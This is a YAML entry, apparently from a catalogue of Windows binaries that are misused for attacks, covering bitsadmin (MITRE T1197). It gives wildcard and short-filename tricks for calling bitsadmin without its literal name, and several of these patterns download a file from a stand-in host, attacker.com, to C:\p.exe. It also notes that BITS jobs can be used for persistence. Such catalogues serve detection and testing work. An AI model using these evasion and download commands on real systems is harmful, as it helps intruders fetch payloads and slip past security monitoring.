---
Name: bitsadmin
Description: "Background Intelligent Transfer Service admin tool. Can download or upload files using BITS jobs, bypassing some network controls."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\bitsadmin.exe
Category: download
MitreID: T1197
Patterns:
  - Pattern: "for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe"
    Wildcards: ["*"]
    Notes: "Star matches 'admin' after 'bits'"
  - Pattern: "for /f %i in ('where b*admin.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star replaces 'its'"
  - Pattern: "for /f %i in ('where bitsad?in.exe') do %i"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'm'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\bits*.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir /b with glob pattern"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m bits*.exe /c \"@file /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe\""
    Wildcards: ["*"]
    Notes: "forfiles * mask finds bitsadmin.exe — @file expands to matched filename for execution"
  - Pattern: "C:\\Windows\\System32\\BITSAD~1.EXE /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe"
    Wildcards: []
    Notes: "8.3 SFN — requires NtfsDisable8dot3NameCreation=0; BITSAD~1 is the auto-generated short name for bitsadmin.exe"
PlatformNotes: |
  CMD glob evasion requires the `for /f` + `where` pattern. BITS jobs persist across reboots by default, making bitsadmin useful for persistence too.

  **8.3 SFN note**: Short filename paths (BITSAD~1.EXE) only exist when 8.3 name generation is enabled (`NtfsDisable8dot3NameCreation=0` in the registry).
Resources:
  - https://attack.mitre.org/techniques/T1197/
  - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
---
